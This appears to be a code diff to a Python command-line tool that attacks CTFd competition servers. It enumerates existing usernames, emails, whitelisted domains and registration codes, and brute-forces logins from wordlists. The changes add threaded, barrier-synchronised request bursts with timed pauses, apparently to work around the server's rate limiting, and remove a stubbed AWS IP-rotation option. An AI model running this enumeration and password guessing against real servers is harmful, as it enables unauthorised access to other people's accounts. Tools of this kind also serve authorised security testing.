@@ -4,9 +4,10 @@
 # dependencies = [
 #   "typer",
 #   "rich",
+#   "colorama",
+#   "tqdm",
 #   "beautifulsoup4",
 #   "requests",
-#   "requests-ip-rotator"
 # ]
 # ///
 
@@ -21,26 +22,39 @@ License:
 """
 
 import copy
-import re
 import time
 from contextlib import contextmanager
 from itertools import chain, zip_longest
+from typing import NamedTuple, Optional, Callable, Any, TypeVar, List
 from pathlib import Path
 from typing import NamedTuple, Optional
+from tqdm.rich import tqdm
+from colorama import Fore, Style
 
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+import threading
 import requests
 import typer
 from bs4 import BeautifulSoup
 from rich.console import Console
 from rich.progress import BarColumn, Progress, TextColumn, TimeElapsedColumn
+import warnings
+from tqdm import TqdmExperimentalWarning
+
+warnings.filterwarnings("ignore", category=TqdmExperimentalWarning)
 
 console = Console()
 app = typer.Typer(add_completion=False)
+console_lock = threading.Lock()
+T = TypeVar("T")
 
 
 # -------------------------
 # Constants
 # -------------------------
+
+USER_AGENT = "ctfd-enum/0.1 (+https://github.com/bjornmorten/ctfd-enum)"
 
 ERROR_PATTERNS: dict[str, tuple[str, bool]] = {
     "username": ("That user name is already taken", True),
@@ -100,19 +114,9 @@ def load_wordlist(path: Path) -> list[str]:
 # -------------------------
 # Requests session
 # -------------------------
-def create_requests_session(base_url: str, rotate: bool = False):
+def create_requests_session(base_url: str):
     session = requests.Session()
-    if rotate:
-        console.print(":x: Rotating IP mode has not been implemented", style="red")
-        raise typer.Exit(code=2)
-
-        """
-        from requests_ip_rotator import ApiGateway
-
-        gateway = ApiGateway(base_url)
-        gateway.start()
-        session.mount(base_url, gateway)
-        """
+    session.headers.update({"User-Agent": USER_AGENT})
     return session
 
 
@@ -145,6 +149,15 @@ def fetch_nonce(session: requests.Session, base_url: str) -> str | None:
         return None
 
 
+def prepare_session(base_url: str) -> tuple[requests.Session, str | None]:
+    """Create a requests session and fetch the initial nonce."""
+    session = create_requests_session(base_url)
+    nonce = fetch_nonce(session, base_url)
+    if not nonce:
+        console.print("[red]Failed to fetch nonce from target[/]")
+    return session, nonce
+
+
 def post_register(
     session: requests.Session,
     base_url: str,
@@ -153,7 +166,7 @@ def post_register(
     email: str | None = None,
     regcode: str | None = None,
 ) -> requests.Response:
-    if not any([username, email, regcode]):
+    if not (username or email or regcode):
         raise ValueError("Either username, email or regcode has to be set.")
 
     url = f"{base_url.rstrip('/')}/register"
@@ -194,6 +207,11 @@ class RegistrationAttempt(NamedTuple):
     registration_code: str | None
 
 
+class LoginAttempt(NamedTuple):
+    username: str
+    password: str
+
+
 def build_registration_attempts(
     usernames: list[str],
     emails: list[str],
@@ -211,6 +229,14 @@ def build_registration_attempts(
             e, d = None, email_field
         attempts.append(RegistrationAttempt(u, e, d, c))
 
+    return attempts
+
+
+def build_login_attempts(
+    usernames: list[str],
+    passwords: list[str],
+) -> list[LoginAttempt]:
+    attempts = [(u, p) for u in usernames for p in passwords]
     return attempts
 
 
@@ -235,7 +261,9 @@ def classify_login_response(r: requests.Response) -> bool:
 def attempt_registration(
     session: requests.Session, base_url: str, nonce: str, attempt: RegistrationAttempt
 ) -> dict[str, bool]:
-    email = attempt.email or (f"@{attempt.email_domain}" if attempt.email_domain else None)
+    email = attempt.email or (
+        f"@{attempt.email_domain}" if attempt.email_domain else None
+    )
     resp = post_register(
         session, base_url, nonce, attempt.username, email, attempt.registration_code
     )
@@ -251,6 +279,121 @@ def attempt_login(
     return valid
 
 
+def print_register_result(
+    attempt: RegistrationAttempt, result: dict[str, bool]
+) -> None:
+    if attempt.username and result["username"]:
+        console.print(f"[green]Found existing username:[/] {attempt.username}")
+    if attempt.email and result["email"]:
+        console.print(f"[green]Found existing email:[/] {attempt.email}")
+    if attempt.email_domain and result["email_domain"]:
+        console.print(
+            f"[green]Found whitelisted email domain:[/] {attempt.email_domain}"
+        )
+    if attempt.registration_code and result["registration_code"]:
+        console.print(
+            f"[green]Found valid registration code:[/] {attempt.registration_code}"
+        )
+
+
+# -------------------------
+# Enumeration orchestration
+# -------------------------
+
+from threading import Barrier
+
+rate_limited = False
+
+
+def safe_worker(
+    item: T, worker: Callable[[T], Any], barrier: Barrier
+) -> tuple[T, Any | Exception]:
+    global rate_limited
+
+    try:
+        barrier.wait()
+    except Exception:
+        pass
+
+    try:
+        if rate_limited:
+            raise Exception("already rate_limited")
+
+        result = worker(item)
+        return item, result, time.time()
+    except RateLimitError as e:
+        rate_limited = True
+        return item, e, time.time()
+    except Exception as e:
+        print(e)
+        return item, e, time.time()
+
+
+from queue import Queue, Empty
+
+
+def run_enumeration(
+    items: list[T],
+    worker: Callable[[T], Any],
+    printer: Callable[[T, Any], None],
+    threads: int,
+):
+    global rate_limited
+
+    queue = Queue()
+    batch_size = threads
+
+    for item in items:
+        queue.put(item)
+
+    total = len(items)
+    last_request_time = time.time()
+
+    with (
+        ThreadPoolExecutor(max_workers=threads) as executor,
+        tqdm(total=total, desc="Enumerating") as pbar,
+    ):
+        while not queue.empty():
+            batch = []
+            for _ in range(batch_size):
+                try:
+                    batch.append(queue.get_nowait())
+                except Empty:
+                    break
+
+            if not batch:
+                break
+
+            barrier = Barrier(min(threads, len(batch)))
+
+            time.sleep(5.25 - (time.time() - last_request_time))
+            rate_limited = False
+
+            futures = [
+                executor.submit(safe_worker, item, worker, barrier) for item in batch
+            ]
+
+            suc = 0
+            err = 0
+            for fut in as_completed(futures):
+                item, result, request_time = fut.result()
+                last_request_time = max(last_request_time, request_time)
+
+                if isinstance(result, Exception):
+                    queue.put(item)
+                    err += 1
+                else:
+                    printer(item, result)
+                    suc += 1
+
+            pbar.update(suc)
+
+            print(
+                f"Batch finished ({len(batch)})",
+                f"{suc=}, {err=} (total: {suc + err})",
+            )
+
+
 # -------------------------
 # Enumeration entrypoints
 # -------------------------
@@ -260,108 +403,53 @@ def enumerate_register(
     emails: list[str],
     domains: list[str],
     codes: list[str],
-    rotate: bool = False,
+    threads: int,
 ):
-    session = create_requests_session(base_url, rotate)
-    nonce = fetch_nonce(session, base_url)
     attempts = build_registration_attempts(usernames, emails, domains, codes)
 
-    # TODO: probe check if registration code and domain whitelisting is enabled
+    def worker(attempt: RegistrationAttempt):
+        session = create_requests_session(base_url)
+        try:
+            nonce = fetch_nonce(session, base_url)
+            if not nonce:
+                return None
+            return attempt_registration(session, base_url, nonce, attempt)
+        finally:
+            try:
+                session.close()
+            except Exception:
+                pass
 
-    if rotate:
-        # TODO
-        raise NotImplementedError("Rotating IP mode has not been implemented")
-    else:
-        # TODO: optimize if regcode is found and is only remaining task: break
-        with Progress(
-            TextColumn("[bold cyan]Enumerating[/]"),
-            BarColumn(),
-            TextColumn("{task.completed}/{task.total}"),
-            TimeElapsedColumn(),
-            console=console,
-        ) as progress:
-            task = progress.add_task("registration", total=len(attempts))
+    def printer(attempt: RegistrationAttempt, result: dict[str, bool]):
+        print_register_result(attempt, result)
 
-            for attempt in attempts:
-                while True:
-                    try:
-                        res = attempt_registration(session, base_url, nonce, attempt)
-                    except RateLimitError:
-                        time.sleep(RATELIMIT_PERIOD)
-                        continue
-                    except Exception as e:
-                        console.print(f"[red]Error while testing {attempt}: {e}[/]")
-                        break
-
-                    if attempt.username and res["username"]:
-                        console.print(f"[green]Found existing username:[/] {attempt.username}")
-                    if attempt.email and res["email"]:
-                        console.print(f"[green]Found existing email:[/] {attempt.email}")
-                    if attempt.email_domain and res["email_domain"]:
-                        console.print(
-                            f"[green]Found whitelisted email domain:[/] {attempt.email_domain}"
-                        )
-                    if attempt.registration_code and res["registration_code"]:
-                        console.print(
-                            f"[green]Found valid registration code:[/] {attempt.registration_code}"
-                        )
-
-                    break
-
-                progress.advance(task)
+    run_enumeration(attempts, worker, printer, threads=threads)
 
 
 def enumerate_login(
     base_url: str,
     usernames: list[str],
     passwords: list[str],
-    rotate: bool = False,
+    threads: int,
 ):
-    session = create_requests_session(base_url, rotate)
-    nonce = fetch_nonce(session, base_url)
+    combos = build_login_attempts(usernames, passwords)
+    session, nonce = prepare_session(base_url)
 
-    if rotate:
-        # TODO
-        raise NotImplementedError("Rotating IP mode has not been implemented")
-    else:
-        total_attempts = len(usernames) * len(passwords)
+    def worker(pair: tuple[str, str]):
+        u, p = pair
+        try:
+            return attempt_login(session, base_url, nonce, u, p)
+        finally:
+            try:
+                session.close()
+            except Exception:
+                pass
 
-        with Progress(
-            TextColumn("[bold cyan]Enumerating[/]"),
-            BarColumn(),
-            TextColumn("{task.completed}/{task.total}"),
-            TimeElapsedColumn(),
-            console=console,
-        ) as progress:
-            task = progress.add_task("login", total=total_attempts)
+    def printer(pair: tuple[str, str], result: bool):
+        if result:
+            tqdm.write(f"Valid: {pair[0]}:{pair[1]}")
 
-            for u in usernames:
-                found_correct_password = False
-
-                for p in passwords:
-                    if found_correct_password:
-                        remaining = len(passwords) - passwords.index(p)
-                        new_total = progress.tasks[0].total - remaining
-                        progress.update(task, total=new_total)
-                        break
-
-                    while True:
-                        try:
-                            res = attempt_login(session, base_url, nonce, u, p)
-                        except RateLimitError:
-                            time.sleep(RATELIMIT_PERIOD)
-                            continue
-                        except Exception as e:
-                            console.print(f"[red]Error while testing {u}:{p}: {e}[/]")
-                            break
-
-                        if res:
-                            console.print(f"[green]Valid:[/] {u}:{p}")
-                            found_correct_password = True
-
-                        break
-
-                    progress.advance(task)
+    run_enumeration(combos, worker, printer, threads=threads)
 
 
 # -------------------------
@@ -372,8 +460,11 @@ def register(
     target: str = typer.Argument(
         ..., help="Base URL of the CTFd instance (e.g. https://demo.ctfd.io)"
     ),
-    rotate: bool = typer.Option(
-        False, "-r", "--rotate-ips", help="Enable IP rotation using AWS Gateways"
+    threads: int = typer.Option(
+        20,
+        "-t",
+        "--threads",
+        help="Number of threads",
     ),
     usernames: Path | None = typer.Option(
         None,
@@ -447,19 +538,28 @@ def register(
 
     console.print(f"[bold cyan]Starting registration enumeration against {target}[/]")
 
-    enumerate_register(target, usernames_list, valid_emails, valid_domains, codes_list, rotate)
+    enumerate_register(
+        target, usernames_list, valid_emails, valid_domains, codes_list, threads
+    )
 
 
 @app.command("login")
 def login(
     target: str = (
-        typer.Argument(..., help="Base URL of the CTFd instance (e.g. https://demo.ctfd.io)")
+        typer.Argument(
+            ..., help="Base URL of the CTFd instance (e.g. https://demo.ctfd.io)"
+        )
     ),
-    rotate: bool = typer.Option(
-        False, "-r", "--rotate-ips", help="Enable IP rotation using AWS Gateways"
+    threads: int = typer.Option(
+        20,
+        "-t",
+        "--threads",
+        help="Number of threads",
     ),
     username: str | None = (
-        typer.Option(None, "-u", "--username", help="Username or email to use in bruteforce")
+        typer.Option(
+            None, "-u", "--username", help="Username or email to use in bruteforce"
+        )
     ),
     usernames: Path | None = typer.Option(
         None,
@@ -507,7 +607,7 @@ def login(
 
     console.print(f"[bold cyan]Starting login enumeration against {target}[/]")
 
-    enumerate_login(target, usernames_list, passwords_list, rotate)
+    enumerate_login(target, usernames_list, passwords_list, threads)
 
 
 if __name__ == "__main__":
